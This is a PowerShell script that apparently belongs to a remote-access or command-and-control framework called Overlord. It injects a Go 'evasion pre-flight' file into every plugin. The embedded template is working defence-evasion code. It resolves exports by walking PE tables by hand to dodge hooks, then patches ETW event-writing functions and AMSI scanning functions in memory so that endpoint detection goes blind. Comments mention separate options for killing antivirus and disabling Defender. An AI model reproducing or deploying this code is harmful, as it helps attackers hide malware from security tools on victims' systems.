#!/usr/bin/env pwsh
# Adds the shared evasion pre-flight to every plugin that lacks it.
#
# Each plugin gets a small evasion_windows.go with its own copy of the
# telemetry patches (ETW + AMSI), because Overlord plugins are separate DLLs
# with no shared code path. The patch logic is identical; only the package
# differs.

$ErrorActionPreference = "Stop"
$root = $PSScriptRoot
$plugins = Get-ChildItem -Path $root -Directory |
    Where-Object { $_.Name -notin @("gateway") -and (Test-Path (Join-Path $_.FullName "native")) }

$template = @'
//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

// ---------------------------------------------------------------------------
// Shared evasion pre-flight.
//
// Applied before this plugin does anything loud. It neutralizes the two
// user-mode telemetry sources an EDR depends on for script and event
// visibility, in-process only:
//
//	ETW   EtwEventWrite*  -> return success without writing the event
//	AMSI  AmsiScanBuffer  -> return success without scanning
//
// Nothing touches disk or other processes, so this stays quiet. The loud
// options (killing AV, disabling Defender) live in the evasion plugin where
// the operator must confirm them.
// ---------------------------------------------------------------------------

var (
	evKernel32 = syscall.NewLazyDLL("kernel32.dll")
	evVProtect = evKernel32.NewProc("VirtualProtect")
	evGetMod   = evKernel32.NewProc("GetModuleHandleW")
)

var evasionDone bool

// preflight applies the evasion set once per process load.
func preflight() {
	if evasionDone {
		return
	}
	evasionDone = true

	etw := patchETW()
	amsi := patchAMSI()

	sendEvent("evasion", map[string]interface{}{
		"etw":  etw,
		"amsi": amsi,
	})
}

func evModule(name string) uintptr {
	p, _ := syscall.UTF16PtrFromString(name)
	r, _, _ := evGetMod.Call(uintptr(unsafe.Pointer(p)))
	return r
}

func evPatch(addr uintptr, patch []byte) bool {
	if addr == 0 {
		return false
	}
	var old uint32
	r, _, _ := evVProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&old)))
	if r == 0 {
		return false
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(dst, patch)

	var tmp uint32
	_, _, _ = evVProtect.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&tmp)))
	return true
}

// evExport walks the PE export table by hand, avoiding GetProcAddress which is
// a common hook site.
func evExport(base uintptr, name string) uintptr {
	if base == 0 {
		return 0
	}
	eLfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	nt := base + uintptr(eLfanew)
	if *(*uint32)(unsafe.Pointer(nt)) != 0x00004550 {
		return 0
	}
	opt := nt + 4 + 20
	expRVA := *(*uint32)(unsafe.Pointer(opt + 112))
	if expRVA == 0 {
		return 0
	}
	exp := base + uintptr(expRVA)

	numNames := *(*uint32)(unsafe.Pointer(exp + 24))
	addrNames := *(*uint32)(unsafe.Pointer(exp + 32))
	addrFuncs := *(*uint32)(unsafe.Pointer(exp + 28))
	addrOrds := *(*uint32)(unsafe.Pointer(exp + 36))

	names := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(addrNames))), numNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(addrFuncs))), numNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(base+uintptr(addrOrds))), numNames)

	for i := 0; i < int(numNames); i++ {
		namePtr := base + uintptr(names[i])
		var b []byte
		for j := 0; j < 256; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			b = append(b, c)
		}
		if string(b) == name {
			ord := ords[i]
			if int(ord) >= len(funcs) {
				return 0
			}
			return base + uintptr(funcs[ord])
		}
	}
	return 0
}

func patchETW() bool {
	ntdll := evModule("ntdll.dll")
	if ntdll == 0 {
		return false
	}
	ok := false
	for _, fn := range []string{"EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteEx", "EtwEventWriteString"} {
		if addr := evExport(ntdll, fn); addr != 0 {
			// xor eax,eax ; ret
			if evPatch(addr, []byte{0x31, 0xC0, 0xC3}) {
				ok = true
			}
		}
	}
	return ok
}

func patchAMSI() bool {
	amsi := evModule("amsi.dll")
	if amsi == 0 {
		return false
	}
	ok := false
	if addr := evExport(amsi, "AmsiScanBuffer"); addr != 0 {
		ok = evPatch(addr, []byte{0x31, 0xC0, 0xC3}) || ok
	}
	if addr := evExport(amsi, "AmsiOpenSession"); addr != 0 {
		_ = evPatch(addr, []byte{0x31, 0xC0, 0xC3})
	}
	return ok
}
'@

$stub = @'
//go:build !windows

package main

// preflight is a no-op off Windows.
func preflight() {}
'@

$count = 0
foreach ($p in $plugins) {
    $nat = Join-Path $p.FullName "native"
    $target = Join-Path $nat "evasion_preflight.go"
    $stubTarget = Join-Path $nat "evasion_preflight_stub.go"

    if (Test-Path $target) {
        Write-Host "[skip] $($p.Name) already has preflight"
        continue
    }

    Set-Content -Path $target -Value $template -NoNewline
    Set-Content -Path $stubTarget -Value $stub -NoNewline
    Write-Host "[ok]   $($p.Name)"
    $count++
}

Write-Host ""
Write-Host "Added preflight to $count plugin(s)."
